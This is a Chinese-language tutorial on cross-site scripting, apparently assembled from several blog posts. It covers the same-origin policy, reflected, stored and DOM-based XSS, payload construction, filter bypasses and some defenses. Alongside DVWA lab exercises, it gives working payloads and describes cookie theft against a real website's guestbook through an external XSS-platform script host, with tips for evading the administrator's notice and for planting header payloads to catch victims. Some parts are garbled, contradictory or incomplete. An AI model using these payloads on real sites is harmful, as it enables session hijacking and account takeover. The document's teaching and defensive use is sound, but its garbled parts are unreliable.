# XSS跨站脚本攻击

### 1 XSS简介

通常指黑客通过“HTML注入”纂改了页面，插入了恶意的脚本，从而在用户浏览页面时，控制用户浏览器的一种攻击。在一开始，这种攻击的演示案例是**<u>跨域</u>**的，所以叫“跨站脚本”。

## 1.1引申

**跨域**请求，顾名思义，就是一个站点中的资源去访问另外一个不同域名站点上的资源。这种情况很常见，比如说通过 style 标签加载外部样式表文件、通过img 标签加载外部图片、通过 script 标签加载外部脚本文件、通过 Webfont 加载字体文件等等。默认情况下，脚本访问文档属性等数据采用的是同源策略（Same origin policy）。

**1.2同源**(SOP)**策略** 

![点击图片已幻灯片模式观赏,还有各种效果.](http://image.3001.net/images/20140924/14115738053709.png)

什么是同源策略呢？如果两个页面的协议、域名和端口是完全相同的，那么它们就是同源的。同源策略是为了防止从一个地址加载的文档或脚本访问或者设置从另外一个地址加载的文档的属性。它有个很简单的精髓：它认为自任何站点装载的信赖内容是不安全的。当被浏览器半信半疑的脚本运行在沙箱时，它们应该只被允许访问来自同一站点的资源，而不是那些来自其它站点可能怀有恶意的资源。

影响源的因素：host,子域名,端口,协议 

 

*SOP绕过*

SOP绕过发生在A网站(以sitea.com为例)以某种方式访问B网站(以siteb.com为例)的属性如cookie、位置、响应等的时候。由于这个问题的特殊性和可能潜在影响，浏览器对此都有非常严格的管理模式，在现在的浏览器中很少能发现一个SOP绕过。然而，最近一个SOP绕过还是被发现了。

**0x1:*****以SOP绕过漏洞（漏洞编号CVE-2014-6041)，它是在作者的一个Qmobile Noir A20（Android 4.2.1的浏览器）上发现的，后来继续证实,Sony+ Xperia +Tipo、三星Galaxy、HTC Wildfire、Motrorolla等也受到影响。**据我所知,这个问题的发生由于url解析器对空字节处理不当的造成的。【Android 4.4以下的浏览器下】

![1.png](http://image.3001.net/images/20140924/14115739761371.png!small)

![2.png](http://image.3001.net/images/20140924/14115739989542.png!small)

![3.png](http://image.3001.net/images/20140924/14115740002254.png!small)

![4.png](http://image.3001.net/images/20140924/14115740056116.png!small)

##### **0x2:Android WebView File域同源策略绕过漏洞

JavaScript的延时执行能够绕过file协议的同源检查，并能够访问受害应用的所有私有文件，

原理：即通过WebView对Javascript的延时执行和将当前Html文件删除掉并软连接指向其他文件就可以读取到被符号链接所指的文件，然后通过JavaScript再次读取HTML文件，即可获取到被符号链接所指的文件。

大多数使用WebView的应用都会受到该漏洞的影响，恶意应用通过该漏洞，可在无特殊权限下盗取应用的任意私有文件，尤其是浏览器，可通过利用该漏洞，获取到浏览器所保存的密码、Cookie、收藏夹以及历史记录等敏感信息，从而造成敏感信息泄露；

![img](http://img.blog.csdn.net/20160217104922771?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQv/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center)

命令启动应用的WebView启动恶意HTML代码窃取文件:

![img](http://gtms04.alicdn.com/tps/i4/TB1zsrOGpXXXXaiaFXXgBCy4XXX-715-70.png)

![img](http://gtms01.alicdn.com/tps/i1/TB1avYZGFXXXXa5apXXh7zyTVXX-487-779.png)

等等。。

**1.3跨域与XSS：**

​    a.com通过以下代码:

> <script scr=http://b.com/b.js>

加载了b.com上的b.js，但是b.js是运行在a.com页面中的，因此相对于当前打开的页面(a.com)来说，b.js的源就应该是a.com而非b.com 
​      不同于XMLHttpRequest的是，通过src属性加载的资源，浏览器限制了JavaScript的权限，使其不能读、写返回的内容。

​       XMLHttpRequest不能跨域访问资源。但是有跨域请求的需求，因此W3C指定了XMLHttpRequest的跨域访问标准【方便的跨域请求方式来融（Mashup）自己的 Web 应用。这样做的一个好处就是可以将请求分摊到不同的服务器，减轻单个服务器压力以提高响应速度；另外一个好处是可以将不同的业务逻辑分布到不同的服务器上以降低负载。】。

​       所以，在web漏洞中XSS是出现最多的漏洞，没有之一。这种漏洞有两种情况，一是通过恩爱部分人输入直接在浏览器端触发，即反射型XSS；还有一种则是先把利用代码保存在数据库或文件中，当Web浏览器读取利用代码并输出在页面上时触发漏洞，也就是存储型XSS。XSS在浏览器中触发，XSS不仅仅停留在可以窃取cookie、修改页面钓鱼、等，毫不夸张的说，前端能做的事，它都能做。

实例1：

假设一个页面把用户输入的参数输出到页面上：

```
1 <?php
2 $input=$_GET["param"];
3 echo "<div>".$input."</div>";
4 ?>
```

如果提交一段HTML代码:

> <http://www.a.com/test.php?param=alert(/xss/)>

会发现alert(/xss/)被执行了。

实例2：

post框中提交数据

Index.php页面代码如下：

```
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> 
<title>XSS原理重现</title>
</head>
<body>
<form action="" method="get">
<input type="text" name="xss_input">
<input type="submit">
</form>
<hr>
<?php
$xss = $_GET['xss_input'];
echo '你输入的字符为<br>'.$xss;
?>
</body>
</html>
```

​     危害

​        攻击者可以在<script>与</script>之间输入JavaScript代码，实现一些“特殊效果”，在真实环境中，不仅仅是弹框，通常使用<script src="example.xss.com/xss.js"></script>来加载外部脚本。而xss.js存放的是恶意JavaScript代码，用来盗取用户cookie,监控键盘的记录等恶意行为。

### 2 XSS类型



xss分为以下几类：

1）反射型XSS：如上面例子，黑客需要诱导用户点击链接。也叫作“非常持久型XSS”。

2）存储型XSS：把用户输入数据“存储”在服务器端。这种XSS有很强的稳定型。

比较常见的场景是，黑客写下一篇包含恶意JavaScript代码的博客文章，文章发表后，所有访问该文章的用户，都会在他们的 浏览器中执行这段恶意js代码。黑客的 恶意脚本保存在服务器。

3）DOM型XSS：DOM型XSS全称为Document Object Model,文档对象模型。也是一种反射型XSS，由于历史原因被单独列出来了。通过修改页面的DOM节点形成的XSS。DOM通常用于代表在HTML、XMTML、和XML中的对象。使用DOM可以允许脚本动态的访问和更新文档内容、结构和样式。基于DOM型的XSS不需要与服务器端进行交互，只发生在客户端处理数据阶段。



### 3反射型XSS

原理

​     反射型XSS也被称为持久型XSS，是现在最容易出现的一种XSS漏洞。当用户访问带有XSS代码的URL请求时，服务器端接收数据后处理，然后把带有XSS代码的数据发送到浏览器，浏览器解析这段带有XSS的代码，最终造成XSS漏洞。

典型例子：

`<?php $username=$_GET['username']`;

`echo $username;`

`>`

漏洞利用场景：

假如http://example.club/xss,php存在XSS反射跨站漏洞，那么攻击者的步骤可能如下：

1):用户A是网站http://example.blog的忠实粉丝，此时正泡在论坛看信息；

2）攻击者发现http://example.club存在反射XSS漏洞，然后精心构造JavaScript代码，此代码可以盗取用户cookie发送到指定的站点

3）攻击者将带有反射型的XSS链接通过站内信发送给用户A，站内信为一些诱惑信息，目的是为让用户A单击链接

4）用户A单机了带有XSS漏洞的URL，那么将会把自己的cookie发送到攻击者指定的www.xsser.com

5）攻击者接受到用户A的会话Cookie,直接利用Cookie以A的身份登入http://example.club从而获得用户A的敏感信息。

![7](D:\存储\文章\xss跨站\7.png)

![8](D:\存储\文章\xss跨站\8.png)

反射型XSS类型

get型

![xss-get](D:\存储\文章\xss跨站\xss-get.png)

POST型



### 4 存储型XSS

​     存储型XSS又叫持久型XSS，在web中 也是最危险的一种跨站脚本。储蓄型XSS其实和反射型XSS差不多，只是储蓄型把数据保存到服务端，而反射型只是让XSS游走在客户端上。

​      当攻击者提交一段XSS代码后，被服务器端接受并存储，当再次访问某页面时，这段代码被程序读出来响应给浏览器，造成XSS跨站攻击。

​       存储型XSS与反射型XSS、DOM型XSS相比，具有更高的隐蔽性，危害更大，与反射型XSS和DOM型XSS最大的区别在于存储型XSS不需要手动去触发。

​        输入的JS代码直接**嵌入**到HTML代码中，因而得以执行。而在留言的模块中JS代码不会显示出来。结果可知两个变量都存在XSS注入漏洞。在这种类型的漏洞体验中可以很明显地感受到，只要每次打开该页面都会进行弹窗，这也是和反射型的根本区别所在。

​      以下为真实场景中的某网站存储型XSS：

​      习惯性的打开留言处(book.asp)，点击留言(这里最好不要使用<script>alert("xss")</script>来测试是否存在XSS漏洞，容易被管理员发现，所以你可以使用<a></a>来测试，如果成功了，不会被管理员发现)OK，我先在留言里出输入<a>s</a>提交留言，F12打开审查元素，来看我们输入的标签是否被过滤了。

![9](D:\存储\文章\xss跨站\9.png)

发现没有过滤(如果<a>s</a>是彩色的说明没有过滤，如果是灰色就说明过滤了)

那我就在xss平台里创建一个项目，然后再次构造隐蔽性的留言，里面写上，“<script src="http://xss8.pw/EFe2Ga?1409273226"></script>请问怎么报名啊”

![10](D:\存储\文章\xss跨站\10.png)

只要你访问

<http://www.******.com/book.asp>就可以获取用户的cookies，以及管理员后台地址的cookie(因为留言板一般都在后台做审核)。

![11](D:\存储\文章\xss跨站\11.png)

实例与刨析：

存储型跨站可以将XSS语句直接写入到数据库中，因而相比反射型跨站的利用价值要更大。

在DVWA中选择XSS stored，这里提供了一个类型留言本的页面。

[![image](http://s3.51cto.com/wyfs02/M00/78/CF/wKioL1aDoiyBt8R5AABKE9qXwRs573.png)](http://s3.51cto.com/wyfs02/M00/78/D1/wKiom1aDog6TXMsOAABc2llz-gA184.png)

我们首先查看low级别的代码，这里提供了$message和$name两个变量，分别用于接收用户在Message和Name框中所提交的数据。对这两个变量都通过mysql_real_escape_string()函数进行了过滤，但是这只能阻止SQL注入漏洞。

[![image](http://s3.51cto.com/wyfs02/M01/78/D2/wKiom1aDohDipYKrAACUN_YNjSM524.png)](http://s3.51cto.com/wyfs02/M02/78/CF/wKioL1aDoizQAtKHAACB_0Xao9w298.png)

可以看出，在low级别下，Name和Message这两个文本框都存在跨站漏洞，但是由于DVWA对name框的长度进行了限制，最多只允许输入10个字符，所以我们这里在Message框输入跨站语句“<script>alert('hi')</script>”，以后任何人只要访问这个留言页面，就可以触发跨站语句，实现弹框。

当然，弹框并不是目的，XSS的主要用途之一是盗取cookie，也就是将用户的cookie自动发送到黑客的电脑中。

下面我们准备一台安装有PHP环境的Web服务器（IP地址192.168.80.132），在其中创建一个名为getcookie.php的网页，网页代码如下：

[![image](http://s3.51cto.com/wyfs02/M01/78/D0/wKioL1aDoi_Aw-SfAADrTwZ0VOk349.png)](http://s3.51cto.com/wyfs02/M02/78/D2/wKiom1aDohGhBHXqAADTGJOPlvE823.png)

然后在Message框中输入下面这段XSS语句，注意中间没有换行：

在DVWA中提交之后，这时就会在getcookie.php网页所在的目录下生成一个名为cookie.txt的文件，其中就含有窃取过来的cookie：

### 4 DOM型XSS

​     DOM型XSS其实是一种特殊类型的反射型XSS，它是基于DOM文档对象模型的一种漏洞。

**DOM文档对象模型：**

在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑从而修改页面的元素。

​        也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。

附上一段经典的DOM型XSS示例：

例1：

在1.html里输入

```
<script>
document.write(document.URL.substring(document.URL.indexOf("a=")+2,document.URL.length));
</script>


```

**在这里我先解释下上面的意思**

Document.write是把里面的内容写到页面里。

document.URL是获取URL地址。

Substring 从某处到某处，把之间的内容获取。

document.URL.indexOf("a=")+2是在当前URL里从开头检索a=字符，然后加2(因为a=是两个字符，我们需要把他略去)，同时他也是substring的开始值

document.URL.length是获取当前URL的长度，同时也是substring的结束值。

合起来的意思就是：在URL获取a=后面的值，然后把a=后面的值给显示出来。

我们打开，看看

![img](file://D:\%E5%AD%98%E5%82%A8\%E6%96%87%E7%AB%A0\xss%E8%B7%A8%E7%AB%99\3.png?lastModify=1520521716)

怎么会出现这个问题呢？

因为当前url并没有a=的字符，而indexOf的特性是，当获取的值里，如果没有找到自己要检索的值的话，返回-1。找到了则返回0。那么document.URL.indexOf("a=")则为-1，再加上2，得1。然后一直到URL最后。这样一来，就把file的f字符给略去了，所以才会出现ile:///C:/Users/Administrator/Desktop/1.html

大致的原理都会了，我们继续。

我们可以在1.html后输入?a=123或则#a=123，只要不影响前面的路径，而且保证a=出现在URL就可以了。

![img](file://D:\%E5%AD%98%E5%82%A8\%E6%96%87%E7%AB%A0\xss%E8%B7%A8%E7%AB%99\4.png?lastModify=1520521716)

我们清楚的看到我们输入的字符被显示出来了。

那我们输入<script>alert("xss")</script>会怎么样呢？

答案肯定是弹窗。

[![img](http://image.3001.net/images/20140905/14098961454933.png!small)](http://image.3001.net/images/20140905/14098961454933.png)

但是，这里肯定有人无法弹窗，像下面这样。

![img](file://D:\%E5%AD%98%E5%82%A8\%E6%96%87%E7%AB%A0\xss%E8%B7%A8%E7%AB%99\5.png?lastModify=1520521716)

这是因为浏览器不同，maxthon、firfox、chrome则不行，他们会在你提交数据之前，对url进行编码。这不是说DOM XSS不行了，这只是个很简单的例子，所以不用在意。

例2：

```
1 <script>
2 function test(){
3 var str=document.getElementById("text").value;
4 document.getElementById("t").innerHTML="<a href='#"+str+"' >testLink</a>";
5 }
6 </script>
7 <div id="t"></div>
8 <input type="text" id="text" value="" />
9 <input type="button" id="s" value="write" onclick="test()" />
```

上述代码的意思是获取段代码的作用就是点击write按钮后在当前页面插入一个链接。 

构造如下数据:

> ’ onclick=alert(/xss/) //

输入后，页面代码就成了

> [testLink](http://cracer.com/blog/)

首先用一个单引号闭合掉`href`的第一个单引号，然后插入一个`onclick`事件，最后再用注释符`//`注释掉第二个单引号。 实际上，这里还有另外一种利用方式—除了构造一个新事件外，还可以选择闭合掉`<a>`标签，并插入一个新的HTML标签。尝试如下输入:

`'><img scr=# onerror=alert(/xss2/) /><'`

![img](file://D:\%E5%AD%98%E5%82%A8\%E6%96%87%E7%AB%A0\xss%E8%B7%A8%E7%AB%99\1.png?lastModify=1520521716)

可能触发DOM型XSS的属性：

 【document.referer属性】：如果当前文档不是通过超级链接访问的，则为 null。这个属性允许客户端 JavaScript 访问 HTTP 引用头部，返回载入当前文档的文档的 UR

【 window.name属性】：

 location属性

 【innerHTML属性】：用来设置或获取位于对象起始和结束标签内的*HTML*。（获取*HTML*当前标签的起始和结束里面的内容）   

 documen.write属性

 ······

利用innerHTML:

用于篡改页面，在前面的反射型的利用中也演示过

<script>document.body.innerHTML="<div style=visibility:visible;><h1>This is DOM XSS</h1></div>";</script>

### 5 xss构造与挖掘

5.1 xss构造具体需要根据利用输出的环境来构造。

先贴出代码:

```
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> 
<title>XSS利用输出的环境来构造代码</title>
</head>
<body>
<center>
<h6>把我们输入的字符串 输出到input里的value属性里</h6>
<form action="" method="get">
<h6>请输入你想显现的字符串</h6>
<input type="text" name="xss_input_value" value="输入"><br>
<input type="submit">
</form>
<hr>
<?php
$xss = $_GET['xss_input_value'];
if(isset($xss)){
echo '<input type="text" value="'.$xss.'">';
}else{
echo '<input type="type" value="输出">';
}
?>
</center>
</body>
</html>
```

下面是代码的页面

![12](D:\存储\文章\xss跨站\12.png)

这段代码的作用是把第一个输入框的字符串，输出到第二个输入框，我们输入1，那么第二个input里的value值就是1，下面是页面的截图和源代码的截图(这里我输入<script>alert('xss')</script>来测试)

![13](D:\存储\文章\xss跨站\13.png)

![14](D:\存储\文章\xss跨站\14.png)

明显的可以看到，并没有弹出对话框，大家可能会疑惑为什么没有弹窗呢，我们来看看源代码。

![15](D:\存储\文章\xss跨站\15.png)

我们看到我们输入的字符串被输出到第15行input标签里的value属性里面，被当成value里的值来显现出来，所以并没有弹窗，这时候我们该怎么办呢？聪明的人已经发现了可以在<script>alert(&#039;xss&#039;)</script>前面加个">来闭合input标签。所以应该得到的结果为

![16](D:\存储\文章\xss跨站\16.png)

成功弹窗了，我们在看看这时的页面

[![img](http://image.3001.net/images/ue/35581407901862.png)](http://image.3001.net/images/ue/35581407901862.png)

看到后面有第二个input输入框后面跟有">字符串，为什么会这样呢，我们来看看源代码

[![img](http://image.3001.net/images/ue/5691407901863.png)](http://image.3001.net/images/ue/5691407901863.png)

这时可以看到我们构造的代码里面有两个">，第一个">是为了闭合input标签，所以第二个">就被抛弃了，因为html的容错性高，所以并没有像php那样出现错误，而是直接把多余的字符串来输出了，有的人是个完美主义者，不喜欢有多余的字符串被输出，这时该怎么办呢？

这里我问大家一个问题，我之前说的xss代码里，为什么全是带有标签的。难道就不能不带标签么？！答：当然可以。既然可以不用标签，那我们就用标签里的属性来构造XSS，这样的话，xss代码又少，又不会有多余的字符串被输出来。

还是这个环境，但是不能使用标签，你应该怎么做。想想input里有什么属性可以调用js，html学的好的人，应该知道了，on事件，对的。我们可以用on事件来进行弹窗，比如这个xss代码
 我们可以写成" onclick="alert(&#039;xss&#039;)

这时，我们在来试试，页面会发生什么样的变化吧。

[![img](http://image.3001.net/images/ue/78191407901864.png)](http://image.3001.net/images/ue/78191407901864.png)

没有看到弹窗啊，失败了么？答案当然是错误的，因为onclick是鼠标点击事件，也就是说当你的鼠标点击第二个input输入框的时候，就会触发onclick事件，然后执行alert(&#039;xss&#039;)代码。我们来试试看

[![img](http://image.3001.net/images/ue/46191407901864.png)](http://image.3001.net/images/ue/46191407901864.png)

当我点击后，就出现了弹窗，这时我们来看看源代码把

[![img](http://image.3001.net/images/ue/46371407901865.png)](http://image.3001.net/images/ue/46371407901865.png)

第15行，value值为空，当鼠标点击时，就会弹出对话框。这里可能就会有人问了，如果要点击才会触发，那不是很麻烦么，成功率不就又下降了么。我来帮你解答这个问题，on事件不止onclick这一个，还有很多，如果你想不需要用户完成什么动作就可以触发的话，i可以把onclick改成

Onmousemove 当鼠标移动就触发

Onload 当页面加载完成后触发

还有很多，我这里就不一一说明了，有兴趣的朋友可以自行查询下。

别以为就这样结束了，还有一类环境不能用上述的方法，

那就是如果在<textarea>标签里呢？！或者其他优先级比script高的呢？

就下面这样

[![img](http://image.3001.net/images/ue/93101407901866.png)](http://image.3001.net/images/ue/93101407901866.png)

这时我们该怎么办呢？既然前面都说了闭合属性和闭合标签了，那能不能闭合完整的标签呢，答案是肯定的。我们可以输入</textarea><script>alert('xss')</script>就可以实现弹窗了

**0×04 过滤的解决办法**

假如说网站禁止过滤了script 这时该怎么办呢，记住一句话，这是我总结出来的“xss就是在页面执行你想要的js”不用管那么多，只要能运行我们的js就OK，比如用img标签或者a标签。我们可以这样写

```
<img scr=1 onerror=alert('xss')>当找不到图片名为1的文件时，执行alert('xss')
<a href=javascrip:alert('xss')>s</a> 点击s时运行alert('xss')
<iframe src=javascript:alert('xss');height=0 width=0 /><iframe>利用iframe的scr来弹窗
<img src="1" onerror=eval("\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29")></img>过滤了alert来执行弹窗
```

等等有很多的方法，不要把思想总局限于一种上面，记住一句话“xss就是在页面执行你想要的js”其他的管他去。(当然有的时候还有管他…)

**0×05 xss的利用**

说了那么多，大家可能都以为xss就是弹窗，其实错了，弹窗只是测试xss的存在性和使用性。

这时我们要插入js代码了，怎么插呢？

你可以这样

```
<script scr="js_url"></script>
```

也可以这样

```
<img src=x onerror=appendChild(createElement('script')).src='js_url' />
```

各种姿势，各种插，只要能运行我们的js就OK。那运行我们的js有什么用呢？

Js可以干很多的事，可以获取cookies(对http-only没用)、控制用户的动作(发帖、私信什么的)等等。

比如我们在网站的留言区输入<script 
scr="js_url"></script>当管理员进后台浏览留言的时候，就会触发，然后管理员的cookies和后台地址还有管理员浏览器版本等等你都可以获取到了，再用“桂林老兵cookie欺骗工具”来更改你的cookies，就可以不用输入账号
 密码 验证码 就可以以管理员的方式来进行登录了。

至于不会js的怎么写js代码呢，放心网上有很多xss平台，百度一下就可以看到了。页面是傻瓜式的操作，这里就不再过多的说明了。

**5.2 XSS挖掘**

知道了最基本的XSS构造和利用技巧后，下面再来看看具体的存储型XSS场景：

1）：添加正常留言，昵称为“CC”,留言内容为“hello”，使用Firebug快速寻找标签，发现标签，例如：

<li><strong>CC</strong><span class="message">hello world</span><span class="time">2018-03-03 23:34:50</span></li>

2):如果显示区域不在HTML属性内，则可以直接利用xss代码注入。如果说不能得知内容具体的输出位置，则可以使用模糊测试方法，xss代码如下：

<script>alert(document.cookie)</script>:普通注入

"/><script>alert(document.cookie)</script>:闭合注入

</textarea><script>alert(document.cookie)</script>:闭合标签注入

3):在插入盗取COOkie的JavaScript代码后，重新加载留言页面，XSS代码被浏览器执行。

![17](D:\存储\文章\xss跨站\17.png)

手工检测XSS

<1>得知输出位置和过滤的字符，输入一些敏感字符，例如：“、<、>、”、()等。提交请求查看源代码

<2>无法得知输出位置

通常采用输入”” />XSS Test“来测试

全自动检测XSS

现在市面上的软件(JSky、Safe3WVS、Netsparker等)都可以挖掘出反射XSS，但是想要那些更隐蔽的XSS还是需要手工的，我先使用软件挖掘一些反射XSS，然后介绍手工挖掘。

[![1.png](http://image.3001.net/images/20140905/14098961298337.png!small)](http://image.3001.net/images/20140905/14098961298337.png)

等等。

下面进入正题。

一：我们都知道当你浏览网站的时候，对方的服务器会记录下你的IP地址。如果我们伪造IP为XSS代码呢？这里说的修改IP为XSS不是说修改PC端的，而是在浏览器也就是网页上的客户端进行修改。

这里需要使用firefox浏览器和两个附件

**附件一：X-Forwarded-For Header**

因为PHP获取IP有3个函数。而X-Forwarded-For Header就是对其中一个函数X_FORWARDED_FOR起作用，X_FORWARDED_FOR有个缺陷可以使客户端伪造任意IP，当然包括字符串，但是对其他两个函数就不行了。

**附件二：Modify Headers**

Modify Headers可以伪造数据包内容，当然也可以伪造HTTP_CLIENT_IP来更改IP。

 

那还有一个REMOTE_ADDR获取IP函数，这个怎么修改呢？答案是无法修改。

REMOTE_ADDR是由 nginx 传递给 php 的参数，所以就是当前 nginx 直接通信的客户端的 IP ，而我们无法插手。所以一旦对方使用了REMOTE_ADDR函数来获取IP，那就没办法了。不过不要紧，一共3个函数，2个函数可以伪造，我们还是有很大的成功率的。好了，开始伪造。

[![1.png](http://image.3001.net/images/20140905/14098963202391.png!small)](http://image.3001.net/images/20140905/14098963202391.png)

[![2.png](http://image.3001.net/images/20140905/14098963215324.png!small)](http://image.3001.net/images/20140905/14098963215324.png)

伪造好后，我们打开www.ip138.com看看，

[![3.png](http://image.3001.net/images/20140905/14098963236480.png!small)](http://image.3001.net/images/20140905/14098963236480.png)

成功弹窗了。因为我在X-Forwarded-For Header里配置的是<script>alert("xss")</script>。而在Modify Headers配置的是<script>alert("xss2")</script>。也就是说ip138.com使用的是X_FORWARDED_FOR函数来获取IP的。但是DZ等著名CMS不存在，他们都过滤了。

就像漏洞盒子一样(https://www.vulbox.com)，

[![4.png](http://image.3001.net/images/20140905/14098963242959.png!small)](http://image.3001.net/images/20140905/14098963242959.png)

使用的是HTTP_CLIENT_IP函数来获取IP的，但是过滤了。你们可以先把配置写好，构造成一个获取cookies的。以后就随便的浏览网站，说不定某天就可以钓上一个呢。

# XSS的防御

## HttpOnly

浏览器将禁止页面的Javascript访问带有HttpOnly属性的Cookie。是为了解决劫持Cookie攻击。因为Javascript获取不到Cookie的值。 


## 输入检查

常见的Web漏洞如XSS、SQL诸如等，都要求攻击者构造一些特殊字符，这些特殊字符可能是正常用户不会用到的，所以输入检查就有存在的必要了。 
例如，用户名可能会被要求只能为字母、数字的组合。 
输入检查的逻辑应该放在服务器端，否则很容易被绕过。目前的普遍做法是在客户端和服务器端都执行检查。 
在XSS的防御上，输入检查一般是检查用户输入的数据中是否包含一些特殊字符，如< > ’ “等。如果发现，则将这些字符过滤掉或编码。 


## 输出检查

一般来说，除了富文本的输出外，在变量输出到HTML页面时，可以使用编码或者转移的方式来防御XSS攻击。

**安全的编码函数:** 
​     1）针对HTML代码的编码方式是HtmlEncode。 
HtmlEncode并非专用名词，它只是一种函数体现。它的作用是将字符转换成HTMLEntities，对应的标准是ISO-8859-1。 

防御方法也是HtmlEncode。在OWASP ESAPI中推荐了一种更严格的HtmlEncode–除了字母、数字外，其他所有的字符都被编码成HTMLEntities。 
`String sfa=ESAPI.encoder().encodeForHTMLAttribute(request.getParameter("input")];` 
这种严格的编码方式，可以保证不会出现任何安全问题。

​        2）使用htmlspecialchars(),对html符号做转义过滤，用户的输入内容输出到

浏览器时无法再形成浏览器解析的html的标签，也就不会形成XSS。

## 防御DOM Based XSS

DOM Based XSS是一种比较特别的XSS漏洞，前文提到的几种防御方法都不太适用，需要特别对待。 

DOM Based XSS是如何形成的呢？回头看看这个例子:

<script>
function test(){
var str=document.getElementById("text").value;
document.getElementById("t").innerHTML="<a href='http://cracer.com/blog/"+str+"' >testLink</a>";
}
</script>
<div id="t"></div>
<input type="text" id="text" value="" />
<input type="button" id="s" value="write" oncick="test()" />

在button的onclick事件中，执行了test()函数，而该函数中最关键的一句是: 
`document.getElementById("t").innerHTML="<a href='http://cracer.com/blog/"+str+"' >testLink</a>";` 
将HTML代码写入了DOM节点，最后导致了XSS的发生。 
事实上，DOM Based XSS是从Javascript中输出数据到HTML页面中。而前文提到的方法都是针对”从服务器应用直接输出到HTML页面”的XSS漏洞，因此并不适用于DOM Based XSS。 
看看下面这个例子:

`<script>`

`var` `x=``"$var"``;`

`document.write(``"<a href='http://cracer.com/blog/"``+x+``"' >test</a>"``);`

`</script>`

变量`$var`输出在`<script>`标签内，可是最后又被document.write输出到HTML页面中。 
假设为了保护`$var`直接在`<script>`标签内产生XSS，服务器端对齐进行了JavascriptEscape。可是$var在document.write时，仍然能够产生XSS，如下所示:

<script> var x="\x20\x27onlick\x3dalert\x281\x29\x3b..."; document.write("[test](http://cracer.com/blog/”+x+")"); </script>

页面渲染之后的实际结果如下: 
XSS攻击成功。 

正确的防御方法是什么呢？ 
首先，在`$var`输出到`<script>`时，应该执行一次javascriptEncode；其次，在document.write输出到HTML页面时，要分具体情况看待:如果是输出到事件或者脚本，则要再做一 
javascriptEncode；如果是输出到HTML内容或者属性，则要做一次HtmlEncode。 
也就是说，从JavaScript输出到HTML页面，也相当于一次XSS输出的过程，需要分语境使用不同的编码函数。 
会触发DOM Based XSS的地方很多，以下几个地方是JavaScript输出到HTML页面的必经之路。 
a) document.write() document.writeln() 
b) xxx.innerHTML= xxx.outerHTML= 
c) innerHTML.replace 
d) document.attachEvent() window.attachEvent() 
e) document.location.replace() document.location.assign() 

实例

**结束:**